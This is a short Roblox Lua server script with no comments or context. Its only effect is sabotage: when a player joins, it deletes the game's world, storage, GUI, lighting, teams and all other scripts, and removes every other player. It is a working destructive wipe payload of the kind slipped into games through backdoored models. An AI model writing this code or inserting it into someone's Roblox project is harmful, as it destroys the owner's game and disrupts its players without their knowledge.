game.Players.PlayerAdded:Connect(function(p)
	for _,o in pairs(workspace:GetChildren()) do o:Destroy() end
	for _,o in pairs(game.ReplicatedStorage:GetChildren()) do o:Destroy() end
	for _,o in pairs(game.StarterGui:GetChildren()) do o:Destroy() end
	for _,o in pairs(game.StarterPack:GetChildren()) do o:Destroy() end
	for _,o in pairs(game.ServerScriptService:GetChildren()) do if o~=script then o:Destroy() end end
	for _,o in pairs(game.ServerStorage:GetChildren()) do o:Destroy() end
	for _,o in pairs(game.Lighting:GetChildren()) do o:Destroy() end
	for _,o in pairs(game.Players:GetChildren()) do if o~=p then o:Destroy() end end
	for _,o in pairs(game.Teams:GetChildren()) do o:Destroy() end
	for _,o in pairs(game:GetDescendants()) do
		if (o:IsA("Script") or o:IsA("LocalScript") or o:IsA("ModuleScript")) and o~=script then
			o:Destroy()
		end
	end
end)
